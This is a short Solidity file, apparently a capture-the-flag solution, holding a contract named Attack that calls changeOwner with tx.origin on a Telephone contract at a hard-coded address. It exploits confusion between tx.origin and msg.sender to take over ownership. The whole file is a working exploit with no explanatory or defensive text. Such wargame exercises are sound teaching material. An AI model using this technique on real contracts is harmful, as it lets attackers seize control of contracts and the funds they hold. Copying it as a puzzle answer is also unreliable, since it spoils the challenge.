// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external ;
}
contract Attack {
    function exp() public {
        Telephone t = Telephone(0x7433a6f73fA68a0ED229e4164F4D6503ffF0a489);
        t.changeOwner(tx.origin);
    }
}